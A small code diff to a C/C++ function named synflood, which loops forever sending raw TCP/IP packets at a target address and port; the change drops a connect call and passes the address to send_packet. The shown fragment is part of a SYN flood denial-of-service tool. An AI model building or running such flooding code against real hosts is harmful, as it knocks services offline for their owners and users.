@@ -7,7 +7,6 @@ void synflood(in_addr_t addr, port_t port)
     srandom(time(NULL));
 
     TCP_IP_RawSocket sd;
-    sd.connect(addr);
 
     while(1) {
         struct iphdr ip;
@@ -30,7 +29,7 @@ void synflood(in_addr_t addr, port_t port)
 
         sd.adjust_TCP_IP_all();
 
-        sd.send_packet();
+        sd.send_packet(addr);
     }
     sd.close();
 }
